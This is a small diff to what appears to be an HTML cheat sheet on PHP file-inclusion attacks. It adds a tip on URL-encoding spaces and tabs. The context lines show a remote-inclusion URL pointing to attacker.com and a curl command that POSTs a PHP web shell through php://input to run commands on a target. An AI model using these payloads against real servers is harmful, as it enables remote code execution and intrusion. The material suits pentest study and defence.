@@ -58,6 +58,7 @@ ftp://user:pass@attacker.com/evil.txt</code></pre>
                    <p>Or to inject php code - Send PHP payload in POST body</p>
                    <pre><code class="language-php">php://input</code></pre>
                    <pre><code class="language-php">curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://10.10.10.1:8080/index.php?language=php://input&cmd=id" | grep uid</code></pre>
+                   <p>Remember to URL encode spaces (%20 (space) %08 (tab))</p> 
                 </ul>
 
                 <h3>zlib://</h3>
